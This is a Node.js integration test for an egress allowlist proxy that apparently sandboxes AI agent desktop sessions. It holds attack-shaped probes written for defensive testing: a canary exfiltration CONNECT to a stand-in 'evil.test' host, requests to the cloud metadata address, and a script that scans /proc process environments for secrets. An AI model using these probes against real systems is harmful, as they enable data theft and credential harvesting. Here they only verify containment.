import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import { createHash, createHmac, randomBytes } from "node:crypto";
import { access, writeFile } from "node:fs/promises";
import path from "node:path";
import test from "node:test";

import { minimalEnvironment, reserveEvidence } from "../scripts/spikes/volume-isolation.mjs";

const OWNER = "11111111-1111-4111-8111-111111111111";
const A = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa";
const B = "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb";
const C = "cccccccc-cccc-4ccc-8ccc-cccccccccccc";
const BOOTSTRAP = "/opt/eclipse/desktop/bootstrap.py";

const probeCode = `
import net from 'node:net'; import tls from 'node:tls';
let s=''; for await (const c of process.stdin) s+=c;
const p=JSON.parse(s);
const auth='Basic '+Buffer.from(p.agent+':'+p.token).toString('base64');
const socket=net.connect({host:'egress-proxy',port:4321});
let finished=false;
const done=(value,code=0)=>{if(finished)return;finished=true;try{socket.destroy()}catch{};console.log(JSON.stringify(value));process.exit(code)};
socket.setTimeout(20000,()=>done({error:'timeout'},4));
socket.once('error',(e)=>done({error:e.code||'error'},5));
socket.once('connect',()=>{
  if(p.kind==='http') socket.write('GET '+p.url+' HTTP/1.1\\r\\nHost: '+new URL(p.url).host+'\\r\\nProxy-Authorization: '+auth+'\\r\\n\\r\\n');
  else socket.write('CONNECT '+p.target+' HTTP/1.1\\r\\nHost: '+p.target+'\\r\\nProxy-Authorization: '+auth+'\\r\\n\\r\\n');
});
let b='';
socket.on('data',function onData(d){
  b+=d.toString('latin1'); if(!b.includes('\\r\\n\\r\\n')) return; socket.removeListener('data',onData);
  const status=b.split('\\r\\n')[0];
  if(!p.tls || !/^HTTP\\/1\\.1 200/.test(status)){ done({status, location:(/\\r\\nlocation:\\s*([^\\r]+)/i.exec(b)?.[1]||null)}); return; }
  const t=tls.connect({socket,servername:p.servername});
  t.once('secureConnect',()=>{const out={status,authorized:t.authorized,protocol:t.getProtocol()};t.destroy();socket.destroy();console.log(JSON.stringify(out));process.exit(0)});
  t.once('error',(e)=>{t.destroy();socket.destroy();console.log(JSON.stringify({status,error:e.code||e.message}));process.exit(6)});
});
`;

const tcpCode = `
import net from 'node:net';
let s=''; for await (const c of process.stdin) s+=c;
const p=JSON.parse(s);
const sock=net.connect({host:p.host,port:p.port});
let done=false; const finish=(v)=>{if(done)return;done=true;try{sock.destroy()}catch{};console.log(JSON.stringify(v));process.exit(0)};
sock.setTimeout(3000,()=>finish({connected:false,error:'timeout'}));
sock.once('error',(e)=>finish({connected:false,error:e.code||'error'}));
sock.once('connect',()=>finish({connected:true}));
`;

const gatewayCode = `
import fs from 'node:fs'; import net from 'node:net';
let gw='';
for(const l of fs.readFileSync('/proc/net/route','utf8').trim().split('\\n').slice(1)){
  const f=l.trim().split(/\\s+/); if(f[1]!=='00000000'||f[2]==='00000000') continue;
  const h=f[2]; gw=[h.slice(6,8),h.slice(4,6),h.slice(2,4),h.slice(0,2)].map(x=>parseInt(x,16)).join('.'); break;
}
if(!gw){console.log(JSON.stringify({connected:false,error:'no_gateway'}));process.exit(0)}
const sock=net.connect({host:gw,port:80}); let done=false;
const finish=(v)=>{if(done)return;done=true;try{sock.destroy()}catch{};console.log(JSON.stringify({...v,gateway:gw}));process.exit(0)};
sock.setTimeout(2000,()=>finish({connected:false,error:'timeout'}));
sock.once('error',(e)=>finish({connected:false,error:e.code||'error'}));
sock.once('connect',()=>finish({connected:true}));
`;

const envCode = `
import fs from 'node:fs';
let s=''; for await (const c of process.stdin) s+=c;
const p=JSON.parse(s);
const environments=[]; const commandLines=[];
for(const pid of fs.readdirSync('/proc').filter(n=>/^[0-9]+$/.test(n))){
  try{
    const status=fs.readFileSync('/proc/'+pid+'/status','utf8');
    const uid=Number(/^Uid:\\s+(\\d+)/m.exec(status)?.[1]);
    commandLines.push(fs.readFileSync('/proc/'+pid+'/cmdline','utf8'));
    if(uid===process.getuid()) environments.push(fs.readFileSync('/proc/'+pid+'/environ','utf8'));
  }catch{}
}
const envText=environments.join('\\0'); const cmdText=commandLines.join('\\0'); const own=JSON.stringify(process.env);
console.log(JSON.stringify({
  tokenEnv:envText.includes(p.token), tokenCmd:cmdText.includes(p.token), tokenProcess:own.includes(p.token),
  desktopEnv:envText.includes(p.desktopSecret), desktopCmd:cmdText.includes(p.desktopSecret),
  controlEnv:envText.includes(p.controlSecret), controlCmd:cmdText.includes(p.controlSecret),
}));
`;

const pushCode = `
let s=''; process.stdin.on('data',(d)=>s+=d).on('end',async()=>{
  const r=await fetch('http://127.0.0.1:4320/v1/policy',{method:'POST',headers:{Authorization:'Bearer '+process.env.EGRESS_PROXY_SECRET,'Content-Type':'application/json'},body:s});
  console.log(r.status); process.exit(r.ok?0:1);
});
`;

const fixtureCode = `import http from 'node:http';http.createServer((q,r)=>{r.setHeader('Content-Type','text/html');r.end('<!doctype html><title>Loopback Fixture</title><h1>fixture</h1>')}).listen(18765,'127.0.0.1',()=>console.log('ready'));`;

test("TASK-045 desktop egress allowlist on a disposable stack", { timeout: 900000 }, async () => {
  const project = `eclipse045${randomBytes(6).toString("hex")}`;
  const evidence = await reserveEvidence(path.resolve("data/spikes/task-045"));
  const summary = { task: "TASK-045", runId: evidence.runId, outcome: "incomplete", phase: "build", checks: [], cleanup: "pending" };
  let dockerPath = "docker";
  if (process.platform === "win32") {
    try { await access("E:\\Apps\\Docker\\resources\\bin\\docker.exe"); dockerPath = "E:\\Apps\\Docker\\resources\\bin\\docker.exe"; } catch { /* PATH fallback. */ }
  }
  const controlSecret = randomBytes(32).toString("hex");
  const proxySecret = randomBytes(32).toString("hex");
  const desktopSecret = randomBytes(32).toString("hex");
  const env = { ...minimalEnvironment(), DESKTOP_CONTROL_SECRET: controlSecret, EGRESS_PROXY_SECRET: proxySecret, EGRESS_DESKTOP_SECRET: desktopSecret,
    POSTGRES_BOOTSTRAP_PASSWORD: randomBytes(24).toString("hex"), POSTGRES_APP_PASSWORD: randomBytes(24).toString("hex"), POSTGRES_MIGRATOR_PASSWORD: randomBytes(24).toString("hex") };
  const empty = path.join(evidence.directory, "empty.env"), override = path.join(evidence.directory, "override.json");
  await writeFile(empty, "", { flag: "wx", mode: 0o600 });
  const labels = { "ai.eclipse.task045.run": project };
  await writeFile(override, JSON.stringify({ services: {
    desktop: { labels, build: { labels } },
    "egress-proxy": { labels, build: { labels } },
  } }), { flag: "wx", mode: 0o600 });
  const prefix = ["compose", "--env-file", empty, "--project-name", project, "--file", path.resolve("docker-compose.yml"), "--file", override];
  const raw = (args, options = {}) => spawnSync(dockerPath, args, { env, encoding: "utf8", windowsHide: true, timeout: 60000, maxBuffer: 8 * 1024 * 1024, ...options });
  const checked = (args, options) => { const result = raw(args, options); assert.equal(result.status, 0, `${summary.phase}: ${String(result.stderr).slice(0, 1500)} ${String(result.stdout).slice(0, 1500)}`); return result.stdout.trim(); };
  const compose = (args, options) => checked([...prefix, ...args], options);
  let container, proxyContainer, built = false;
  const admin = (command, id = A, extra = [], owner = OWNER) => checked(["exec", "--user", "0:0", container, "python3", BOOTSTRAP, "--admin", command, owner, id, ...extra]);
  const agent = (id, code) => admin("exec", id, ["node", "--input-type=module", "-e", code]);
  const agentInput = (id, code, input) => checked(["exec", "-i", "--user", "0:0", container, "python3", BOOTSTRAP, "--admin", "exec", OWNER, id, "node", "--input-type=module", "-e", code], { input: JSON.stringify(input), timeout: 70000 });
  const wait = async (probe, attempts = 90, delay = 500) => { for (let i = 0; i < attempts; i++) { if (await probe()) return; await new Promise((resolve) => setTimeout(resolve, delay)); } assert.fail(`timeout_${summary.phase}`); };
  const health = (id) => checked(["inspect", "--format", "{{.State.Health.Status}}", id]);
  const waitHealthy = (id) => wait(async () => health(id) === "healthy", 120, 500);
  const token = (id) => createHmac("sha256", desktopSecret).update(`v1:${id}`).digest("hex");
  const push = (policy) => checked(["exec", "-i", proxyContainer, "node", "--input-type=module", "-e", pushCode], { input: JSON.stringify(policy), timeout: 20000 });
  const sessionEnv = (display) => `import fs from 'node:fs';import assert from 'node:assert/strict';import{spawnSync}from'node:child_process';
    const runtime=fs.readdirSync('/tmp').filter(n=>n.startsWith('ec-${display + 19900}-')).map(n=>'/tmp/'+n).find(n=>{try{return fs.lstatSync(n).uid===process.getuid()&&spawnSync('xdpyinfo',[],{env:{PATH:process.env.PATH,DISPLAY:':${display}',XAUTHORITY:n+'/Xauthority'},stdio:'ignore',timeout:1000}).status===0;}catch{return false;}});assert.ok(runtime);
    const env={PATH:process.env.PATH,HOME:process.env.HOME,DISPLAY:':${display}',XAUTHORITY:runtime+'/Xauthority'};
    const cmd=(a)=>{const r=spawnSync('xdotool',a,{env,encoding:'utf8',timeout:2000});assert.equal(r.status,0);return r.stdout.trim();};`;
  const navigate = (display, url) => agent(A, sessionEnv(display) + `cmd(['key','--clearmodifiers','ctrl+l']);cmd(['type','--clearmodifiers','--delay','1','--',${JSON.stringify(url)}]);cmd(['key','Return']);`);
  const title = (display) => agent(A, sessionEnv(display) + "console.log(cmd(['getactivewindow','getwindowname']));");
  // TASK-071: agent processes are in a private network namespace. The proxy is probed from the container's root
  // namespace with the same per-agent token; the browser reaches it through the session relay.
  const probe = (input) => JSON.parse(checked(["exec", "-i", "--user", "0:0", container, "node", "--input-type=module", "-e", probeCode], { input: JSON.stringify({ agent: A, ...input }) }));
  const probeAgent = (id, input) => JSON.parse(checked(["exec", "--user", "0:0", container, "node", "--input-type=module", "-e", probeCode], { input: JSON.stringify({ agent: id, ...input }) }));
  const eventsCode = `const r=await fetch('http://127.0.0.1:4320/v1/events?after=0',{headers:{Authorization:'Bearer '+process.env.EGRESS_PROXY_SECRET}});console.log(JSON.stringify(await r.json()));`;
  const events = () => JSON.parse(checked(["exec", proxyContainer, "node", "--input-type=module", "-e", eventsCode]));
  let fixture;
  try {
    compose(["build", "desktop", "egress-proxy"], { timeout: 900000 }); built = true;
    compose(["up", "-d", "--no-build", "desktop", "egress-proxy"]);
    container = compose(["ps", "-q", "desktop"]); proxyContainer = compose(["ps", "-q", "egress-proxy"]);
    assert.ok(container && proxyContainer);
    await waitHealthy(container); await waitHealthy(proxyContainer);
    summary.phase = "provision";
    admin("create", A); admin("create", B); admin("create", C);
    const started = JSON.parse(admin("session-start", A));
    assert.equal(started.state, "running");
    const display = started.display;
    await wait(async () => { try { return title(display).length > 0; } catch { return false; } }, 60, 500);
    summary.checks.push("disposable_stack_session_running");

    summary.phase = "push";
    assert.equal(push({ agentId: A, domains: ["example.com"], blocked: false }), "200");
    assert.equal(push({ agentId: B, domains: [], blocked: true }), "200");
    summary.checks.push("policy_pushes_authenticated_and_stored");

    summary.phase = "connect";
    const aToken = token(A);
    const allowed = probe({ kind: "connect", token: aToken, target: "example.com:443", tls: true, servername: "example.com" });
    assert.match(allowed.status, /^HTTP\/1\.1 200/);
    assert.equal(allowed.authorized, true, JSON.stringify(allowed));
    assert.ok(allowed.protocol, JSON.stringify(allowed));
    summary.checks.push("allowlisted_public_host_connect_and_tls");

    const refused = (input) => probe({ kind: "connect", token: aToken, ...input }).status;
    assert.match(refused({ target: "example.org:443" }), /^HTTP\/1\.1 403/);
    assert.match(refused({ target: "169.254.169.254:443" }), /^HTTP\/1\.1 403/);
    assert.match(refused({ target: "10.0.0.1:443" }), /^HTTP\/1\.1 403/);
    assert.match(refused({ target: "example.com:80" }), /^HTTP\/1\.1 403/);
    assert.match(probe({ kind: "connect", token: token(B), target: "example.com:443" }).status, /^HTTP\/1\.1 407/);
    summary.checks.push("unlisted_private_metadata_wrong_token_and_non_443_refused");

    summary.phase = "canary";
    const canary = `ecx-${randomBytes(16).toString("hex")}`;
    const canaryHash = createHash("sha256").update(canary, "utf8").digest("hex");
    assert.equal(push({ agentId: C, domains: ["example.com"], blocked: false, canaryHashes: [canaryHash] }), "200");
    const leaked = probeAgent(C, { kind: "connect", token: token(C), target: `${canary}.evil.test:443` });
    assert.match(leaked.status, /^HTTP\/1\.1 403/, JSON.stringify(leaked));
    assert.match(probeAgent(C, { kind: "connect", token: token(C), target: "example.com:443" }).status, /^HTTP\/1\.1 403/);
    assert.match(probe({ kind: "connect", token: aToken, target: "example.com:443", tls: true, servername: "example.com" }).status, /^HTTP\/1\.1 200/);
    const canaryEvents = events().events.filter((event) => event.agentId === C);
    assert.equal(canaryEvents.length, 1, JSON.stringify(canaryEvents));
    assert.equal(canaryEvents[0].source, "proxy_host");
    assert.equal(JSON.stringify(canaryEvents).includes(canary), false);
    summary.checks.push("canary_connect_trips_owner_before_resolve_and_peer_stays_allowed");

    const http = (url) => probe({ kind: "http", token: aToken, url });
    const redirect = http("http://example.com/path?q=1");
    assert.match(redirect.status, /^HTTP\/1\.1 307/);
    assert.equal(redirect.location, "https://example.com/path?q=1");
    assert.match(http("http://169.254.169.254/").status, /^HTTP\/1\.1 403/);
    summary.checks.push("plain_http_redirects_to_https_and_private_targets_are_refused");

    summary.phase = "direct";
    const publicTcp = JSON.parse(agentInput(A, tcpCode, { host: "1.1.1.1", port: 443 }));
    assert.equal(publicTcp.connected, false, JSON.stringify(publicTcp));
    const gateway = JSON.parse(agentInput(A, gatewayCode, {}));
    assert.equal(gateway.connected, false, JSON.stringify(gateway));
    const unprepared = JSON.parse(agentInput(A, `const r=await fetch('http://egress-proxy:4320/v1/forward',{method:'POST'});console.log(JSON.stringify({status:r.status}));`, {}));
    assert.equal(unprepared.status, 401);
    summary.checks.push("no_direct_public_gateway_or_unauthenticated_app_proxy_route");

    summary.phase = "environment";
    const secrets = JSON.parse(agentInput(A, envCode, { token: aToken, desktopSecret, controlSecret }));
    assert.equal(secrets.tokenEnv, false); assert.equal(secrets.tokenCmd, false); assert.equal(secrets.tokenProcess, false);
    assert.equal(secrets.desktopEnv, false); assert.equal(secrets.desktopCmd, false);
    assert.equal(secrets.controlEnv, false); assert.equal(secrets.controlCmd, false);
    summary.checks.push("token_and_service_secrets_absent_from_agent_env_and_cmdlines");

    summary.phase = "browser";
    assert.equal(push({ agentId: A, domains: ["example.com"], blocked: false }), "200");
    navigate(display, "https://example.com");
    await wait(async () => { try { return /Example Domain/i.test(title(display)); } catch { return false; } }, 40, 500);
    summary.checks.push("real_chromium_loads_allowlisted_page");
    navigate(display, "https://www.iana.org");
    await wait(async () => { try { return !/Example Domain/i.test(title(display)); } catch { return false; } }, 20, 500);
    const blockedTitle = title(display);
    assert.ok(!/Internet Assigned Numbers Authority/i.test(blockedTitle), blockedTitle);
    summary.checks.push("real_chromium_blocks_unlisted_page");

    summary.phase = "loopback";
    fixture = spawn(dockerPath, ["exec", "--user", "0:0", container, "python3", BOOTSTRAP, "--admin", "exec", OWNER, A, "node", "--input-type=module", "-e", fixtureCode], { env, stdio: ["ignore", "pipe", "pipe"], windowsHide: true });
    await new Promise((resolve, reject) => {
      const timer = setTimeout(() => reject(new Error("fixture_timeout")), 20000);
      fixture.stdout.on("data", (chunk) => { if (chunk.toString().includes("ready")) { clearTimeout(timer); resolve(); } });
      fixture.once("error", reject);
    });
    navigate(display, "http://127.0.0.1:18765/");
    await wait(async () => { try { return /Loopback Fixture/i.test(title(display)); } catch { return false; } }, 20, 500);
    summary.checks.push("loopback_fixture_still_reachable_through_bypass");

    summary.outcome = "passed"; summary.phase = "complete";
  } catch (error) { summary.reason = `failed_${summary.phase}`; throw error; }
  finally {
    try { fixture?.kill(); } catch { /* already exited */ }
    try {
      for (const [kind, listing] of [["container", ["ps", "-aq"]], ["network", ["network", "ls", "-q"]], ["volume", ["volume", "ls", "-q"]]]) {
        for (const id of checked([...listing, "--filter", `label=com.docker.compose.project=${project}`]).split(/\r?\n/).filter(Boolean)) {
          const [value] = JSON.parse(checked([kind, "inspect", id]));
          assert.equal((kind === "container" ? value.Config.Labels : value.Labels)["com.docker.compose.project"], project);
        }
      }
      compose(["down", "--volumes", "--remove-orphans"]);
      if (built) {
        for (const service of ["desktop", "egress-proxy"]) {
          const tag = `${project}-${service}:latest`;
          const [image] = JSON.parse(checked(["image", "inspect", tag]));
          assert.ok(image.RepoTags.includes(tag)); assert.equal(image.Config.Labels["ai.eclipse.task045.run"], project); checked(["image", "rm", tag]);
        }
      }
      summary.cleanup = "complete";
    } catch { summary.cleanup = "refused"; summary.outcome = "incomplete"; summary.remainingProject = project; }
    await writeFile(path.join(evidence.directory, "result.json"), JSON.stringify(summary, null, 2) + "\n", { flag: "wx", mode: 0o600 });
    console.log(`TASK-045 evidence: data/spikes/task-045/${evidence.runId}/result.json`);
    assert.equal(summary.cleanup, "complete");
  }
});
